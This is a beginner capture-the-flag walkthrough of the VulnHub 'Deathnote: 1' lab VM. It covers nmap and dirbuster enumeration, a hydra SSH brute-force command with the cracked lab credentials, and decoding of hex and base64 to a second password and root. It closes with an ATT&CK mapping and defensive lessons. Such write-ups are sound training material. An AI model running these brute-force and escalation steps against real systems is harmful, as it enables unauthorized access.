
## Deathnote


| **Platform**   | VulnHub      |
| -------------- | ------------ |
| **Machine**    | Deathnote: 1 |
| **Creator**    | HWDKS        |
| **OS**         | Linux        |
| **Difficulty** | Beginner     |

use `netdiscover` to find the VM, then run `nmap`.


`nmap -sV -v 10.0.2.23`       


| Port | Service | Details                                        |
| ---- | ------- | ---------------------------------------------- |
| 22   | SSH     | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80   | http    | Apache httpd 2.4.38 ((Debian))                 |


going to the http leads to a website. there is a huge hint button that suggests we find a notes.txt.

<img width="1518" height="622" alt="image" src="https://github.com/user-attachments/assets/e1785a4b-c10b-4075-acd1-350850f9c828" />


interesting stuff;


there is also a page that allows us to leave a comment. if we check it for input sanitization, the comment is not let through and left for moderation.

using `dirbuster` shows several interesting directories, namely
`wp-content/uploads`

<img width="1545" height="622" alt="image" src="https://github.com/user-attachments/assets/ba2e3c04-701a-4689-ba7b-c06efb630f55" />


in `wp-content/uploads/2021/07/` we see `notes.txt` and `user.txt`, a list of what appears to be passwords and users respectively. save them and use `hydra` to bruteforce `ssh` access.

~~~
hydra -L user.txt -P notes.txt -t 4 10.0.2.23 ssh
[22][ssh] host: 10.0.2.23   login: l   password: death4me
~~~

great!

~~~
l@deathnote:~$ cat user.txt
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
~~~


this is [brainfuck language](https://brainfuck.org/). using [dcode](https://www.dcode.fr/) yields:


`"i think u got the shell , but you wont be able to kill me -kira"`



in `/home/kira` there is a `kira.txt`, but we have no permissions to read it.
eventually, we find something interesting:


~~~
/opt/L/fake-notebook-rule$ cat case.wav
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
~~~

looks like hexadecimal. it decodes into a `base64` string, which, in turn, gives us a password.


~~~sh
$ echo -n "63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d" |xxd -r -p    
cGFzc3dkIDoga2lyYWlzZXZpbCA=                                                                                
$ echo -n "cGFzc3dkIDoga2lyYWlzZXZpbCA="|base64 -d
passwd : kiraisevil   
~~~


try to `su kira` using the password, which works.
`kira.txt` contains a `base64` string, which doesn't really get us anything interesting in either of the directories.

~~~
kira@deathnote:~$ cat kira.txt
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp   
~~~

list kira's permissions.


~~~
kira@deathnote:/$ sudo -l

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
~~~


which means we can `sudo su`, and get the root flag.
 


#### MITRE ATT&CK Mapping

| **Step**                               | **Actions**          | **Technique**                                 |
| -------------------------------------- | -------------------- | --------------------------------------------- |
| Scan with Nmap                         | Service discovery    | T1595 Active scanning                         |
| Access /uploads/                       | Directory listing    |                                               |
| Bruteforcing with hydra                | Brute force          | T1110 Brute Force                             |
| SSH with found credentials             | Initial access       | T1078 Valid Account                           |
| Find second user's account credentials | Decode file contents | T1140 Deobfuscate/Decode Files or Information |
| Switch user to root                    | Privilege Escalation | T1078 Valid Account                           |
| Access root flag                       | Read local file      | T1005 Data from Local System                  |


#### Vulnerability Table

| **Vulnerability**                         | **Impact**                                     |
| ----------------------------------------- | ---------------------------------------------- |
| Directory Listing                         | Access to files containing usernames/passwords |
| Plaintext credentials                     | Credential access                              |
| Unlimited login attempts                  | Bruteforcing                                   |
| Weak encryption of sensitive data at rest | Credential access                              |
| Unlimited privileges                      | Privilege escalation                           |


#### Lessons Learned

- Do not store credentials in easily accessible files with no encryption
- Do not store credentials in easily accessible files with weak encryption
- Only give users permissions necessary for them to do their job 
